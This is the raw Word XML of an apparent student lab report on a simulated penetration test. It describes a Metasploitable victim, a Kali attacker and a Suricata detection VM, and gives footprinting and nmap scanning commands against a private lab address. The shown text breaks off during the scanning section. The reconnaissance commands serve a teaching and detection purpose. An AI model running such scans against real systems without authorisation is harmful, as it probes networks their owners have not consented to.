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4DB5A" w14:textId="3D6478C5" w:rsidR="00A71D15" w:rsidRPr="00995558" w:rsidRDefault="00940653" w:rsidP="00A71D15">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t>Intrusion Detecting Project Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBD4890" w14:textId="46884580" w:rsidR="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:r w:rsidRPr="00940653">
        <w:t>The project was designed to simulate the stages of a penetration test, using a victim, attacker, and detection system in a controlled environment</w:t>
      </w:r>
      <w:r>
        <w:t>, in this case of Virtual Machines</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve">. The goal was to simulate each step of an </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:t xml:space="preserve">intrusion: </w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve">Footprinting, Scanning, Enumeration, and </w:t>
      </w:r>
      <w:r w:rsidR="0091277A" w:rsidRPr="00940653">
        <w:t>Exploitatio</w:t>
      </w:r>
      <w:r w:rsidR="0091277A">
        <w:t>n,</w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t>while implementing and testing different intrusion detection techniques to monitor the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> activity</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12040FA0" w14:textId="2D26FC96" w:rsidR="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t>Set-up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A135BA0" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:p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  <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>The setup involved configuring a network of 3 Virtual Machines using Oracle VirtualBox. The machines included the following roles:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AEE98F" w14:textId="56FA61E3" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="0094065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  <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim: A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM, which is vulnerable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploitation. This VM was set up with default configurations for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">this intrusive </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>pursopes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5842E405" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="0094065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  <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker: A Kali Linux VM, used as the attacker machine to perform various penetration testing activities. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>This</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>included</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>scanning</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploitation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>attempts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19328230" w14:textId="688BC6BE" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="0094065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  <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Detection: Initially, an Ubuntu Server was configured to run Suricata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>, Wireshark (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> in this case as it was a CLI), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an Intrusion Detection System (IDS). However, during the setup, multiple issues took place:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B93445" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653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  <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>The Ubuntu server had a network interface issue where the system used enp0s3 instead of the expected eth0. As a result, Suricata failed to detect the traffic properly, as the IDS was unable to listen on the correct network interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791703D2" w14:textId="2F215B16" w:rsidR="00940653" w:rsidRDefault="00940653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  <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Due to this issue, the planned detection system had to be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>changed for</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> another Kali Linux VM configured to run </w:t>
      </w:r>
      <w:r w:rsidR="00445E03">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> detection. This allowed Suricata to monitor traffic </w:t>
      </w:r>
      <w:r w:rsidR="00445E03">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>correctly</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA2A427" w14:textId="48137A02" w:rsidR="00445E03" w:rsidRDefault="00445E03" w:rsidP="00445E03">
      <w:p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To guarantee that all machines are in the same network the following command has to be executed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6120C1E4" w14:textId="682DAA8E" w:rsidR="00445E03" w:rsidRDefault="00445E03" w:rsidP="00445E03">
      <w:p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t>sudo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</w:rPr>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> eth0 192.168.1.xx netmask 255.255.255.0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612FCDF9" w14:textId="79C39C6F" w:rsidR="00445E03" w:rsidRPr="00940653" w:rsidRDefault="00445E03" w:rsidP="00445E03">
      <w:p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In my case victim is 10, attacker 20 and detection 30.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2C06E1" w14:textId="61877428" w:rsidR="00EE442E" w:rsidRDefault="00170A90" w:rsidP="00EE442E">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidR="00940653">
        <w:t>Footprinting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E06D95C" w14:textId="521D5D25" w:rsidR="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:r w:rsidRPr="00940653">
        <w:t>Objective: Gather preliminary information about the target without directly interacting with it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CF6784" w14:textId="30155912" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Tools and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Techniques</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC2EB13" w14:textId="598181C4" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653">
      <w:pPr>
        <w:pStyle w:val="Prrafodelista"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>WHOIS Lookup</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve"> (for external IPs or domains):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C1139D" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:t>whois</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve"> &lt;target-domain&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011A5FF8" w14:textId="6036D34C" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00170A90" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">1.2 </w:t>
      </w:r>
      <w:r w:rsidR="00940653" w:rsidRPr="00940653">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DNS Enumeration</w:t>
      </w:r>
      <w:r w:rsidR="00940653" w:rsidRPr="00940653">
        <w:t xml:space="preserve"> (for identifying domain records):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE05481" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">nslookup: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1816C789" w14:textId="1DFA2CB3" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">nslookup </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF19CB9" w14:textId="77777777" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>dig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1649C3" w14:textId="6BAD5515" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653" w:rsidP="00940653">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>dig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00940653">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>192.168.1.10 example.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E188E8A" w14:textId="2E8A408E" w:rsidR="00940653" w:rsidRPr="00940653" w:rsidRDefault="00940653">
      <w:pPr>
        <w:pStyle w:val="Prrafodelista"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ping Sweep</w:t>
      </w:r>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6010AA5F" w14:textId="4875B2C0" w:rsidR="004B46F2" w:rsidRPr="004B46F2" w:rsidRDefault="00940653" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00940653">
        <w:t xml:space="preserve">ping </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A64E709" w14:textId="4F4B5FAB" w:rsidR="005A1803" w:rsidRPr="00995558" w:rsidRDefault="005A1803" w:rsidP="005A1803">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r w:rsidRPr="00995558">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r w:rsidR="00445E03">
        <w:t>Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E4177" w14:textId="7E324732" w:rsidR="00170A90" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Objective: Identify live hosts, open ports, and running services in the network.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Tools and Techniques:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128D6ACA" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.1. Network Scanning with Nmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F4B322" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5489051A" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Scans the network to identify which hosts are live.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2795A9E9" w14:textId="138FFFF6" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Port </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Scanning</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00170A90">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A425F7" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
